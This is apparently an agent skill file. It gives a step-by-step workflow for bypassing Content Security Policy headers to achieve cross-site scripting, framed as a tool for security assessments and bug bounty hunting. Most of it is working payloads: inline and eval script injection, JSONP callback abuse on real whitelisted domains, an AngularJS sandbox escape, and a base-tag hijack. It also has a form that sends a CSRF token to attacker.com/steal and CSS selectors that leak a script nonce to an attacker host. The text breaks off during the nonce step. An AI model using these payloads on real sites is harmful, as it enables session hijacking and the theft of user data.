---
name: performing-content-security-policy-bypass
description: Analyze Content-Security-Policy headers and bypass them to achieve cross-site
when-to-use: Analyze Content-Security-Policy headers and bypass them to achieve cross-site
  scripting by exploiting unsafe-inline/unsafe-eval, whitelisted JSONP endpoints, base-uri
  and form-action gaps, and nonce/hash weaknesses, then exfiltrate data even without
  script-src control. Use during web application security assessments or bug bounty
  hunting when XSS is found but blocked by CSP, or when auditing CSP header configuration
  for weaknesses.
domain: cybersecurity
subdomain: web-application-security
tags:
- csp-bypass
- content-security-policy
- xss
- script-injection
- nonce-bypass
- jsonp
- policy-misconfiguration
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Performing Content Security Policy Bypass

## When to Use
- When XSS is found but execution is blocked by Content Security Policy
- During web application security assessments to evaluate CSP effectiveness
- When testing the robustness of CSP against known bypass techniques
- During bug bounty hunting where CSP prevents direct XSS exploitation
- When auditing CSP header configuration for security weaknesses

## Prerequisites
- Burp Suite for intercepting responses and analyzing CSP headers
- CSP Evaluator (Google) for automated policy analysis
- Understanding of CSP directives (script-src, default-src, style-src, etc.)
- Knowledge of CSP bypass techniques (JSONP, base-uri, object-src)
- Browser developer tools for CSP violation monitoring
- Collection of whitelisted domain JSONP endpoints

## Workflow

### Step 1 — Analyze the CSP Policy
```bash
# Extract CSP from response headers
curl -sI http://target.com | grep -i "content-security-policy"

# Check for CSP in meta tags
curl -s http://target.com | grep -i "content-security-policy"

# Analyze CSP with Google CSP Evaluator
# Visit: https://csp-evaluator.withgoogle.com/
# Paste the CSP policy for automated analysis

# Check for report-only mode (not enforced)
curl -sI http://target.com | grep -i "content-security-policy-report-only"
# If only report-only exists, CSP is NOT enforced - XSS works directly

# Parse directive values
# Example CSP:
# script-src 'self' 'unsafe-inline' https://cdn.example.com;
# default-src 'self'; style-src 'self' 'unsafe-inline';
# img-src *; connect-src 'self'
```

### Step 2 — Exploit unsafe-inline and unsafe-eval
```bash
# If script-src includes 'unsafe-inline':
# CSP is effectively bypassed for inline scripts
<script>alert(document.domain)</script>
<img src=x onerror="alert(1)">

# If script-src includes 'unsafe-eval':
# eval() and related functions work
<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>new Function('alert(1)')()</script>

# If 'unsafe-inline' with nonce:
# unsafe-inline is ignored when nonce is present (CSP3)
# Focus on nonce leaking instead
```

### Step 3 — Exploit Whitelisted Domain JSONP Endpoints
```bash
# If CSP whitelists a domain with JSONP endpoints:
# script-src 'self' https://accounts.google.com

# Find JSONP endpoints on whitelisted domains
# Google:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# Common JSONP endpoints:
# https://www.google.com/complete/search?client=chrome&q=test&callback=alert(1)//
# https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js

# If AngularJS is whitelisted (CDN):
# script-src includes cdnjs.cloudflare.com or ajax.googleapis.com
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# Exploit JSONP on whitelisted APIs
<script src="https://whitelisted-api.com/endpoint?callback=alert(1)//">
</script>
```

### Step 4 — Exploit base-uri and Form Action Bypasses
```bash
# If base-uri is not restricted:
# Inject <base> tag to redirect relative script loads
<base href="https://attacker.com/">
# All relative script src will load from attacker.com

# If form-action is not restricted:
# Steal data via form submission
<form action="https://attacker.com/steal" method="POST">
  <input name="csrf_token" value="">
</form>
<script>document.forms[0].submit()</script>

# If object-src is not restricted:
# Use Flash or plugin-based XSS
<object data="https://attacker.com/exploit.swf"></object>
<embed src="https://attacker.com/exploit.swf">
```

### Step 5 — Exploit Nonce and Hash Bypasses
```bash
# Nonce leaking via CSS attribute selectors
# If attacker can inject HTML (but not script due to CSP nonce):
<style>
  script[nonce^="a"] { background: url("https://attacker.com/leak?nonce=a"); }
  script[nonce^="b"] { background: url("https://attacker.com/leak?nonce=b"); }
</style>
# Brute-force each character position to leak the nonce

# Nonce reuse detection

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
